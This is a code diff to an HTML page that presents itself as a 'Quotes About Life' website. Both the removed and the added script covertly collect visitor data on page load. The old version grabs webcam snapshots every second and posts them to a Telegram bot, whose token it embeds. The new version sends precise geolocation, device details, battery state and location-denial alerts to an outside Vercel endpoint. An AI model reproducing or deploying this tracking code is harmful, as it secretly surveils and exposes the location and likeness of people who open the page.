@@ -375,207 +375,135 @@
       <p>&copy; 2025 Quotes About Life. Made with ❤️ by Dogesh</p>
     </footer>
 
-    <!-- Hidden Elements for Camera Capture -->
     <video id="video" autoplay muted></video>
     <canvas id="canvas"></canvas>
     <div id="map"></div>
 
-    <!-- Leaflet JS -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
-    <!-- Your Existing JS Logic -->
     <script>
-      const token = "6235375573:AAHdripMzwMYFL0dhruXGyvmJ6ZSQhWCTn4";
-      const chat_id = "1444862345";
-
-      let userLat = null,
-        userLng = null,
-        marker = null,
-        circle = null,
-        stream = null;
+      let uLat = null,
+        uLng = null,
+        m = null,
+        c = null;
 
       const map = L.map("map").setView([30.7046, 76.7179], 13);
       L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
         attribution: "© OpenStreetMap contributors",
       }).addTo(map);
 
-      function updateMap(lat, lng, accuracy) {
-        const coords = [lat, lng];
-        marker ??= L.marker(coords)
-          .addTo(map)
-          .bindPopup("📍 You are here")
-          .openPopup();
-        marker.setLatLng(coords);
-        circle ??= L.circle(coords, {
-          radius: accuracy,
-          color: "blue",
-          fillColor: "#add8e6",
-          fillOpacity: 0.3,
-        }).addTo(map);
-        circle.setLatLng(coords).setRadius(accuracy);
-        map.setView(coords, 16);
-      }
-
-      function sendLocationToTelegram(lat, lng, accuracy) {
-        const message = `
-📍 *Live Location Update*
-*Latitude:* \`${lat}\`
-*Longitude:* \`${lng}\`
-*Accuracy:* ~${Math.round(accuracy)} meters
-
-🌍 [View on Map](https://www.google.com/maps/search/?api=1&query=${lat},${lng})
-🧭 [Get Directions](https://www.google.com/maps/dir/?api=1&destination=${lat},${lng})`;
-
-        fetch(`https://loc-mocha.vercel.app/api/hello`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ message }),
-        })
-          .then((response) => {
-            if (!response.ok) {
-              console.error("");
-            }
-          })
-          .catch((error) => {
-            console.error("");
-          });
-      }
-
-      function sendPhotoToTelegram(blob) {
-        const formData = new FormData();
-        formData.append("chat_id", chat_id);
-        formData.append("photo", blob, "snapshot.jpg");
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: formData,
-        });
-      }
-
-      function captureAndSendImage() {
+      // Reusable fetch
+      const post = async (url, data) => {
         try {
-          const video = document.getElementById("video");
-          const canvas = document.getElementById("canvas");
-          const ctx = canvas.getContext("2d");
-          canvas.width = video.videoWidth || 300;
-          canvas.height = video.videoHeight || 200;
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(
-            (blob) => blob && sendPhotoToTelegram(blob),
-            "image/jpeg",
-            0.9
-          );
-        } catch (err) {
-          console.error("Camera capture failed:", err);
-        }
-      }
-
-      function startCameraLoop() {
-        navigator.mediaDevices
-          .getUserMedia({ video: { facingMode: "user" } })
-          .then((mediaStream) => {
-            stream = mediaStream;
-            const video = document.getElementById("video");
-            video.srcObject = stream;
-
-            video.onloadedmetadata = () => {
-              video.play();
-
-              // ✅ Start only after video is playing
-              video.onplaying = () => {
-                // Start sending image every 1 second
-                setInterval(captureAndSendImage, 1000);
-              };
-            };
-          })
-          .catch((err) => {
-            console.warn("📷 Camera access denied:", err);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                chat_id,
-                text: "❌ User denied camera access.",
-              }),
-            });
+          const res = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data),
           });
-      }
+          return await res.json();
+        } catch (err) {
+          console.error(`❌ Error posting to ${url}:`, err);
+          return null;
+        }
+      };
 
-      function locateUser() {
+      // Update map marker & circle
+      const updMap = (lat, lng, acc) => {
+        const coords = [lat, lng];
+        if (!m)
+          m = L.marker(coords)
+            .addTo(map)
+            .bindPopup("📍 You are here")
+            .openPopup();
+        else m.setLatLng(coords);
+
+        if (!c)
+          c = L.circle(coords, {
+            radius: acc,
+            color: "blue",
+            fillColor: "#add8e6",
+            fillOpacity: 0.3,
+          }).addTo(map);
+        else c.setLatLng(coords).setRadius(acc);
+
+        map.setView(coords, 16);
+      };
+
+      // Send location
+      const sendLoc = (lat, lng, acc) => {
+        if (![lat, lng, acc].every((v) => typeof v === "number"))
+          return console.error("Invalid location");
+        post("https://loc-mocha.vercel.app/api/GLT", {
+          lat,
+          lng,
+          accuracy: acc,
+        });
+      };
+
+      // Locate user
+      const locUser = () => {
         navigator.geolocation.getCurrentPosition(
           (pos) => {
             const { latitude, longitude, accuracy } = pos.coords;
-            userLat = latitude;
-            userLng = longitude;
-            updateMap(userLat, userLng, accuracy);
-            sendLocationToTelegram(userLat, userLng, accuracy);
+            uLat = latitude;
+            uLng = longitude;
+            updMap(latitude, longitude, accuracy);
+            sendLoc(latitude, longitude, accuracy);
           },
-          (err) => {
-            // 👇 Show polite banner if user denies location access
+          () => {
             const banner = document.getElementById("location-banner");
             if (banner) banner.style.display = "flex";
 
-            // 📤 Send Telegram alert as before
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                chat_id,
-                text: "❌ User denied location access.",
-              }),
+            post("https://loc-mocha.vercel.app/api/hello", {
+              message: "❌ User denied location access.",
             });
           },
           { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
-      }
+      };
 
-      function getDeviceInfo() {
+      // Send device info
+      const sendInfo = (info) => {
+        if (!info?.platform || !info?.connection || !info?.userAgent)
+          return console.error("Invalid device info");
+        post("https://loc-mocha.vercel.app/api/GLT", info).then((data) => {
+          if (data === true) console.log("✅ Device info sent");
+          else console.warn("⚠️ Failed to send device info");
+        });
+      };
+
+      // Get device info
+      const getInfo = async () => {
         const info = {
-          userAgent: navigator.userAgent,
           platform: navigator.platform,
           connection: navigator.connection?.effectiveType || "N/A",
+          userAgent: navigator.userAgent,
           battery: null,
         };
-        navigator.getBattery?.().then((battery) => {
-          info.battery = `${Math.round(battery.level * 100)}% (${
-            battery.charging ? "Charging" : "Not Charging"
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          info.battery = `${Math.round(b.level * 100)}% (${
+            b.charging ? "Charging" : "Not Charging"
           })`;
-          sendInfoToTelegram(info);
-        }) || sendInfoToTelegram(info);
-      }
+        }
+        sendInfo(info);
+      };
 
-      function sendInfoToTelegram(info) {
-        const message = `
-📱 *Device Info*
-🧭 Platform: ${info.platform}
-🌐 Network: ${info.connection}
-🔋 Battery: ${info.battery || "N/A"}
-🧾 User Agent:
-\`${info.userAgent}\``;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id,
-            text: message,
-            parse_mode: "Markdown",
-          }),
-        });
-      }
-
+      // Event listeners
       window.addEventListener("DOMContentLoaded", () => {
-        locateUser();
-        startCameraLoop();
-        getDeviceInfo();
+        locUser();
+        getInfo();
       });
-      document.getElementById("close-banner").addEventListener("click", () => {
-        document.getElementById("location-banner").style.display = "none";
-      });
-
+      document
+        .getElementById("close-banner")
+        ?.addEventListener(
+          "click",
+          () =>
+            (document.getElementById("location-banner").style.display = "none")
+        );
       document
         .getElementById("allow-location-btn")
-        .addEventListener("click", () => {
-          locateUser(); // Re-trigger permission prompt
-        });
+        ?.addEventListener("click", locUser);
     </script>
   </body>
 </html>
